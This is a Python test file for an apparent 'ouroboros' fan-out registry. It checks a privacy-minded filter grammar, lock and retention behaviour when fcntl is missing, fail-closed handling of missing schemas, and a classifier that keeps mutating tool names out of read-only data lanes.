            {
                "key": "data_context",
                "content": _round77_answer("logins", ["month=202607", "date=20260725"]),
            }
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete", out.get("contract_violations")

    # The narrowing is calendar-shaped, not a blanket digit pass: an entity
    # key with a date-like value and a non-calendar digit run both still fail.
    from ouroboros.contracts.data_evidence import _identity_scope_problem

    assert _identity_scope_problem("user_id=202607", "filters[0]") is not None
    # 6-digit non-calendar values are category-code width and admitted since
    # round 82 (naics_code=541511); opaqueness starts at seven digits.
    assert _identity_scope_problem("cohort=9999999", "filters[0]") is not None
    assert _identity_scope_problem("day=20260231", "filters[0]") is not None


def test_round81_letter_hex_scope_values_are_refused_by_the_grammar(tmp_path: Any) -> None:
    """release=deadbeef: advertised and enforced now agree — by refusal.

    The validator has always read a letter-bearing 8+ hex value as an opaque
    identifier; the published grammar admitted it, so a schema-valid answer
    left a required lane partial. The refusal lives in the shared grammar
    string now, and calendar partitions (digits only) stay admitted.
    """
    from ouroboros.contracts.data_evidence import (
        _READ_REQUEST_FILTER,
        _data_context_answer_contract,
    )

    published = _data_context_answer_contract()["response_model_schema"]["$defs"]["read_request"][
        "properties"
    ]["filters"]["items"]["pattern"]
    assert published == _READ_REQUEST_FILTER.pattern

    for refused in ("release=deadbeef", "segment=a1b2c3d4e5"):
        assert not _READ_REQUEST_FILTER.match(refused), refused
    for admitted in ("month=202607", "date=20260725", "cohort=enterprise", "build=v2_1"):
        assert _READ_REQUEST_FILTER.match(admitted), admitted

    # And an admitted scope still completes end-to-end.
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id="sess-81",
        lanes=[{"lane_id": "data_context", "capability": "data_context", "required": True}],
    )
    assert fanout_id is not None
    out = submit_fanout_results(
        registry,
        session_id="sess-81",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": _round77_answer("logins", ["build=v2_1"])}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete", out.get("contract_violations")


# --------------------------------------------------------------------------- #
# round-82 — process-local exclusion is unconditional; categorical codes pass
# --------------------------------------------------------------------------- #


def test_round82_two_threads_cannot_both_complete_without_fcntl(tmp_path: Any) -> None:
    """The documented process-local guarantee must not depend on fcntl.

    Without it, exclusive() yielded with no exclusion at all, and a
    synchronized two-thread probe produced two divergent complete responses
    while only one outcome survived durably.
    """
    import builtins
    import threading
    from unittest.mock import patch

    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout(
        registry,
        session_id="sess-82",
        payloads=_mixed_advisory_payloads(),
    )
    results = [
        {"key": "ambiguity_contrarian", "content": "contrarian-advice"},
        {"key": "answer_simplifier", "content": "simplifier-advice"},
    ]

    real_import = builtins.__import__

    def _no_fcntl(name: str, *args: Any, **kwargs: Any) -> Any:
        if name == "fcntl":
            raise ImportError("no fcntl on this platform")
        return real_import(name, *args, **kwargs)

    barrier = threading.Barrier(2)
    outcomes: list[dict[str, Any]] = []

    def _submit() -> None:
        barrier.wait()
        outcomes.append(
            submit_fanout_results(
                registry,
                session_id="sess-82",
                correlation_key="context.lane_id",
                results=results,
                fanout_id=fanout_id,
            )
        )

    with patch("builtins.__import__", side_effect=_no_fcntl):
        threads = [threading.Thread(target=_submit) for _ in range(2)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()

    statuses = sorted(str(outcome.get("status")) for outcome in outcomes)
    # Exactly one submission completes; the other observes the terminal
    # record and replays it.
    assert statuses == ["already_complete", "complete"], statuses


def test_round82_numeric_category_codes_complete_end_to_end(tmp_path: Any) -> None:
    """naics_code=541511 is a published category, not an entity.

    Six digits is the standard width of category codes, and the opaque rule
    read every 6-digit run as an identifier — a schema-valid answer left a
    required lane partial. Opaqueness now starts at seven digits; the
    identifiers that matter (phone, SSN, card) are all longer, and an
    entity-NAMED key is rejected before the value is consulted.
    """
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id="sess-82b",
        lanes=[{"lane_id": "data_context", "capability": "data_context", "required": True}],
    )
    assert fanout_id is not None
    out = submit_fanout_results(
        registry,
        session_id="sess-82b",
        correlation_key="context.lane_id",
        results=[
            {"key": "data_context", "content": _round77_answer("logins", ["naics_code=541511"])}
        ],
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete", out.get("contract_violations")

    from ouroboros.contracts.data_evidence import _identity_scope_problem

    # The boundary of the narrowing: 7+ digits stays opaque, entity keys
    # stay rejected whatever the value.
    assert _identity_scope_problem("cohort=9999999", "filters[0]") is not None
    assert _identity_scope_problem("user_id=541511", "filters[0]") is not None


# --------------------------------------------------------------------------- #
# round-83 — legacy schemas fail closed; locks are bounded; retention is
# platform-independent
# --------------------------------------------------------------------------- #


def test_round83_missing_legacy_schema_fails_closed(tmp_path: Any) -> None:
    """A persisted contract with no usable schema cannot accept content.

    Continuing without a violation completed the fan-out with arbitrary
    unvalidated content persisted terminally. Round 17's rule for a broken
    $ref applies a fortiori to a schema that is absent entirely.
    """
    registry = FanoutRegistry(tmp_path)
    record = FanoutRecord(
        fanout_id="legacy-83",
        kind=FANOUT_KIND_QUESTION_ADVISORY,
        session_id="sess-83",
        correlation_key="context.lane_id",
        expected_keys=("ref_lane",),
        required_keys=("ref_lane",),
        synthesizer_input={
            "lane_ids": ["ref_lane"],
            "lane_answer_contracts": {"ref_lane": {"contract_id": "future_ref.v1"}},
        },
    )
    assert bool(registry.save(record))

    out = submit_fanout_results(
        registry,
        session_id="sess-83",
        correlation_key="context.lane_id",
        results=[{"key": "ref_lane", "content": {"anything": "at all"}}],
        fanout_id="legacy-83",
    )

    assert out["status"] == "partial"
    assert out.get("contract_violations")
    assert not registry.load("legacy-83").received_results


def test_round83_unknown_ids_mint_no_durable_artifacts(tmp_path: Any) -> None:
    """25 unknown ids: no lock files, no cached locks growing per id.

    The lock table is a fixed 256-stripe array, so caller-supplied ids cannot
    grow process memory, and a never-registered id takes no lock and creates
    no sidecar.
    """
    from ouroboros.mcp.tools.subagent import _LOCAL_FANOUT_LOCK_STRIPES

    registry = FanoutRegistry(tmp_path)
    for index in range(25):
        out = submit_fanout_results(
            registry,
            session_id="s",
            correlation_key="context.persona",
            results=[],
            fanout_id=f"never-registered-{index}",
        )
        assert out["status"] == "unknown_fanout_id"

    assert list(tmp_path.iterdir()) == [], "unknown ids minted durable artifacts"
    assert len(_LOCAL_FANOUT_LOCK_STRIPES) == 256


def test_round83_retention_applies_without_fcntl(tmp_path: Any) -> None:
    """Stale records are swept on fcntl-less platforms too.

    Returning early meant expired records lived forever there, contradicting
    the seven-day retention contract.
    """
    import builtins
    import os as os_module
    import time
    from unittest.mock import patch

    registry = FanoutRegistry(tmp_path)
    record = _persona_record("stale-83")
    assert bool(registry.save(record))
    stale_path = tmp_path / "stale-83.json"
    old = time.time() - (8 * 24 * 3600)
    os_module.utime(stale_path, (old, old))

    real_import = builtins.__import__

    def _no_fcntl(name: str, *args: Any, **kwargs: Any) -> Any:
        if name == "fcntl":
            raise ImportError("no fcntl on this platform")
        return real_import(name, *args, **kwargs)

    with patch("builtins.__import__", side_effect=_no_fcntl):
        # Registration triggers the opportunistic sweep.
        register_question_advisory_fanout(
            registry,
            session_id="sess-83-sweep",
            payloads=_mixed_advisory_payloads(),
        )

    assert not stale_path.exists(), "stale record survived the fcntl-less sweep"


# --------------------------------------------------------------------------- #
# round-84 — network and derived identifiers; state-transition verbs
# --------------------------------------------------------------------------- #


def test_round84_network_and_derived_identifiers_are_entities(tmp_path: Any) -> None:
    """ip=192.168.1.1 and grouping by email_hash are per-person scopes.

    A dotted quad identifies a device whatever the key is called, and a hash
    of an identity value is a pseudonym with the same cardinality — the head
    reduces nothing.
    """
    from ouroboros.contracts.data_evidence import _entity_key, _identity_scope_problem

    assert _identity_scope_problem("ip=192.168.1.1", "filters[0]") is not None
    assert _identity_scope_problem("client=10.0.0.7", "filters[0]") is not None
    assert _entity_key("email_hash")
    assert _entity_key("user_digest")
    # The narrowing that matters: non-identity modifiers keep their heads.
    assert not _entity_key("content_hash")
    assert not _entity_key("build_checksum")
    assert not _entity_key("customer_segment")


def test_round84_state_transition_verbs_are_mutators(
    tmp_path: Any,
    monkeypatch: Any,
) -> None:
    """reset_database / patch_customer / post_webhook, at both layers.

    The config filter and re-entry share the classifier, so one vocabulary
    fixes admission and evidence together (the round-79 shape).
    """
    from ouroboros.contracts.data_evidence import _mutating_tool_verb
    from ouroboros.mcp.tools.authoring_handlers import (
        _advisory_lanes_with_known_data_tools,
    )

    for name in ("reset_database", "patch_customer", "post_webhook"):
        assert _mutating_tool_verb(name) is not None, name
    for name in ("dataset_query", "offset_reader", "settings_lookup", "clickhouse_query"):
        assert _mutating_tool_verb(name) is None, name

    monkeypatch.setenv(
        "OUROBOROS_KNOWN_DATA_TOOLS", "reset_database,patch_customer,clickhouse_query"
    )
    lanes = _advisory_lanes_with_known_data_tools(
        {"lanes": [{"lane_id": "data_context", "capability": "data_context"}]}
    )
    tools = next(
        (lane.get("known_data_tools") for lane in lanes if lane.get("lane_id") == "data_context"),
        None,
    )
    assert tools == ["clickhouse_query"]

    # Re-entry: the same name as an executed evidence source is rejected.
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id="sess-84",
        lanes=[{"lane_id": "data_context", "capability": "data_context", "required": True}],
    )
    answer = _round77_answer("logins", [])
    answer["evidence"][0]["source"] = "reset_database"
    out = submit_fanout_results(
        registry,
        session_id="sess-84",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": answer}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert out.get("contract_violations")
